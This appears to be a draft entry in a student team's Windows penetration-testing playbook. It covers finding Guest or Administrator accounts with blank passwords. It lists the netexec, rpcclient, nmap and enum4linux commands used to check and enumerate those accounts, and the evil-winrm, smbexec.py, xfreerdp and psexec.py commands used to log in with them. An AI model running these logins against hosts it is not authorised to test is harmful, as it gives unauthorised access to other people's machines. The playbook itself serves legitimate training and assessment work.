*Draft: command steps not filled in yet.*

# 2. Default Guest or Administrator Account Without a Password

- **Phase:** No credentials (check); Initial access (log in with the account)
- **Risk:** 🟡 Noisy: the check is itself a login, and Windows logs every login
- **Tier:** Recognize
- **Finding:** library L20 (`default-credentials`)
- **Runs on:** any Windows host
- **Ports:** 139, 445 (SMB)
- **Tools:** rpcclient, netexec (check); evil-winrm, xfreerdp, smbexec.py from Impacket (log in)

## What it is
Windows has built-in Guest and Administrator accounts. If either is enabled with a blank password, anyone on the network can log in as it. A blank Administrator password hands over the host.

The 2024 Runlist lists "Guest/Administrator" under No credentials but only "Guest" under Initial access. Check both.

## Commands

Scaning:
<br>


1. Look for a guest user without a password:

```netexec smb <TARGET_IP> -u guest -p "" --shares```

Look for guest domain user without password:

```netexec smb <TARGET_IP> -u <DOMAIN>\\guest -p "" --shares```

Look for admin user without password:
```netexec smb <TARGET_IP> -u Administrator -p "" --shares```

Look for admin domain user without password:
```netexec smb <TARGET_IP> -u <DOMAIN>\\Administrator -p "" --shares```

<br>
2. Use the following to try to enumerate guest users:
<br><br>


A. Enumerate all users in the domain:
```rpcclient -U "" <TARGET_IP> -N```
```enumdomusers```

B. Enumerate all users through SMB
```Nmap -Pn -p 445 --script smb-enum-users <TARGET_IP>```

C.  Enumerate users through enum4linux:
```enum4linux -U <TARGET_IP>```

D. Enumerate users through nbtscan:
```nbtscan <TARGET_IP>```

For each user enumerated with A - D, rerun this netexec command to verify the lack of password:
netexec smb 10.129.184.69 -u guest -p "" --shares

Exploit:
```evil-winrm -i <TARGET_IP> -u guest
smbexec.py guest@<TARGET_IP>
xfreerdp /u:guest /p:'' /v:<TARGET_IP>
psexec.py  guest@<TARGET_IP> -no-pass
```

## Once it works
- Note what the account can reach (shares, remote login), then pass it to the team as a credential.

## Evidence to capture
- `evidence/F-NNN-01.png`: the successful login or session as the account, with the empty password visible in the command.
- The logged command with its timestamp.

## Practice
- **HTB box:** Archetype (Starting Point; needs the Starting Point VPN)
- **Walkthrough:** [[TODO: none in the 2024 doc; add a link]]

---
*Adapted from the CCSF 2024 Windows playbooks. Updated by the CCSF 2026 team.*
